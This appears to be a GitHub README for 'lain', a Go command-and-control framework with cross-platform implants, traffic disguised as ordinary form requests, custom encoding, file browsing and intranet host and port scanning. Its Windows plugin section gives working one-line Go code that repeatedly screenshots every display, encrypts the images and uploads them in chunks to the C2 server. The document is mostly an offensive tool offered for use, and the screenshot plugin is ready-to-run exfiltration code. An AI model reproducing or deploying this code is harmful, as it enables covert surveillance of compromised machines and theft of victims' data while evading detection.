![start.png](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/start.png)

## lain command-control-frame work

golang framework,agent it supports platforms such as Windows linux、macos、Android。 The currently supported communication protocols are https \ http

### Features

Custom server error response

sharing host to players

Custom CSS file

Multiplayer-mode

Dynamic-encryption

Cross-platform

intranet-information-collection

File Browser

Segmented file transfer

web-ui

Customize Plugins code

group jobs

jobs、result cache

msg queue operation

Customize implants request parameters

Client history file directory cache

Access control whitelist

Customize log language messages

### Getting Started

```json
{
    "users": [
        {
            "username": "aaf95bdd47f00d8435c49185",
            "password": "dfb95aac49185dd47f008435"
            //Change the password and username field to md5 encryption and remove the last 8 digits
        }
    ]
}
```

```cmd
Usage of C:\Users\ADMINI~1\AppData\Local\Temp\go-build3450987718\b001\exe\server.exe:
  -DefaultCert
        Use default public and private keys
  -cert string
        Customize public key path
  -css string
        Use default css file
  -http
        Use HTTP instead of HTTPS
  -key string
        Customize private key path
  -p string
        Port (default "443")
  -resp-error string
        web error resp (default "error")
  -title string
        web ui title (default "connect")
```

![image-20250722224250819](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/help.png)

### Start server

Open the listening c2 service port. In order to better conceal and simulate real traffic, all traffic is get and post forms, write the request parameters for communication with the implant, and the parameters must not be repeated. Then select http\https

![lain_c2/html/image-1.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-1.png)

After the update, a custom Base64 encoding feature has been added. It supports generating either a random encoding table or a user-provided table that conforms to the Base64 rules. Each listening service is associated with a unique encoding table.

![lain_c2/html/image-2.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-2.png)

Click the corresponding platform link to generate the implant code

![lain_c2/html/image-3.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-3.png)

### Plugin Code into Implants

Each listening service inserts the same plug-in code

![lain_c2/html/image-6.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-6.png)

plugin code be like this,the top is the plugin code, then you must select the number of parameters (not less than the actual parameters), compress the Go language code into one line and enter the necessary parameters into the input box. The last input box is the description of the parameters

![lain_c2/html/image-4.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-4.png)

 the description of the parameters: msg1, msg2; description of msg1 parameters, description of msg2 parameters (the corresponding parameter descriptions are separated by check marks and corresponding indexes)

![lain_c2/html/image-9.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-9.png)

Plugin code for different platforms

![lain_c2/html/image-8.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-8.png)

Windows

WindowsJpg

Parameter count 4

interval,duration,quality,slices

```go
intervalSec,err:=strconv.Atoi(msg1);if err!=nil||intervalSec<=0{intervalSec=3};durationSec,err:=strconv.Atoi(msg2);if err!=nil||durationSec<=0{durationSec=30};quality,err:=strconv.Atoi(msg3);if err!=nil||quality<1||quality>100{quality=80};intSize,err:=strconv.Atoi(msg4);if err!=nil||intSize<1048576{intSize=1048576};frameInterval:=time.Duration(intervalSec)*time.Second;duration:=time.Duration(durationSec)*time.Second;numCaptures:=int(duration/frameInterval);bounds:=screenshot.GetDisplayBounds(0);for i:=1;i<screenshot.NumActiveDisplays();i++{bounds=bounds.Union(screenshot.GetDisplayBounds(i))};for i:=0;i<numCaptures;i++{img,err:=screenshot.CaptureRect(bounds);if err!=nil{continue};jpegBuf:=new(bytes.Buffer);err=jpeg.Encode(jpegBuf,img,&jpeg.Options{Quality:quality});if err!=nil{continue};fileContent:=EncryptDecrypt(jpegBuf.Bytes());fileSize:=len(fileContent);start:=0;end:=intSize;for start<fileSize{if end>fileSize{end=fileSize};str_encry:=user+"^"+strconv.Itoa(intSize)+"^"+strconv.Itoa(fileSize)+"^"+strconv.Itoa(start)+"^"+strconv.Itoa(end);data_encry:=get_encry_s(&str_encry);chunk:=fileContent[start:end];var buffer bytes.Buffer;writer:=multipart.NewWriter(&buffer);filename:=time.Now().Format("20060102_150405")+".jpg";encFilename:=get_encry_s(&filename);part,err:=writer.CreateFormFile("/*upload*/",encFilename);if err!=nil{break};_,err=io.Copy(part,bytes.NewReader(chunk));if err!=nil{break};writer.WriteField("/*uid*/",uid);writer.WriteField("/*result*/",data_encry);writer.Close();url:=protocol+master+"//*Path*/?/*option*/=/*upload*/";req,err:=http.NewRequest("POST",url,&buffer);if err!=nil{break};req.Header.Set("Content-Type",writer.FormDataContentType());req.Header.Set("Range","bytes="+strconv.Itoa(start)+"-"+strconv.Itoa(end-1));resp,err:=client.Do(req);if err!=nil{break};resp.Body.Close();if resp.StatusCode!=http.StatusOK{break};start=end;end=start+intSize;time.Sleep(time.Duration(delay)*time.Second)};time.Sleep(frameInterval)}
```



### change Implant info

Modify the input directly and press the Save Change button

![lain_c2/html/image-7.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-7.png)

### Implant Terminal

![lain_c2/html/image-10.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-10.png)

### File Browser

![lain_c2/html/image-11.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-11.png)

### sniff host choose port

![lain_c2/html/image-12.png at main · Mazzy-Stars/lain_c2](https://github.com/Mazzy-Stars/lain_c2/raw/main/html/image-12.png)

    scan host [target 192.168.1(1,20,45...)or(1-253)]	[range(1,20,45...)or(1-65534)]	[delay])
    scan port [target 192.168.1.1] [range(1,20,45...)or(1-65534)]	[delay])
